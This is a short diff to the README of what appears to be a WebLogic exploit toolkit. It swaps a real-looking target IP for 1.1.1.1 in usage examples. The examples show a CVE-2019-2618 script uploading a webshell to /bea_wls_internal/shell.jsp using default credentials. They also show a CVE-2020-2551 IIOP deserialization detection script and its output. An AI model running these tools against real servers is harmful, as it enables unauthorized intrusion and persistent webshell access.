@@ -255,7 +255,7 @@
 > ```
 > EXP:
 > ```
-> zhzy@debian:/debian/archives-tool/web-weblogic$ python cve-2019-2618_webshell.py http://182.61.16.221:7007/ weblogic Oracle@123
+> zhzy@debian:/debian/archives-tool/web-weblogic$ python cve-2019-2618_webshell.py http://1.1.1.1:7007/ weblogic Oracle@123
 > 
 > ========================================================================
 >    _______      ________    ___   ___  __  ___       ___   __ __  ___  
@@ -269,13 +269,13 @@
 >                               By Jas502n     
 > ========================================================================
 > >>>>Upload Shell Addresss: 
-> http://182.61.16.221:7007/bea_wls_internal/shell.jsp
+> http://1.1.1.1:7007/bea_wls_internal/shell.jsp
 > ```
 
 ## cve-2020-2551_poc.py Weblogic IIOP 反序列化漏洞检测脚本
 > USE:
 > ```
-> zhzy@debian:$ python3 cve-2020-2551_poc.py -u http://182.61.16.221:7007
+> zhzy@debian:$ python3 cve-2020-2551_poc.py -u http://1.1.1.1:7001
 > +---------------------------------------------------   -----+
 > + USE: python cve-2020-2551_poc.py <url:port>               +
 > + VER: 10.3.6.0.0                                           +
@@ -284,6 +284,6 @@
 > +      12.2.1.4.0                                           +
 > + EXP: python3 cve-2020-2551_poc.py -u http://1.1.1.1:7001  +
 > +-----------------------------------------------------------+
-> [+] found CVE-2020-2551  182.61.16.221:7007
+> [+] found CVE-2020-2551  1.1.1.1:7007
 > ```
 
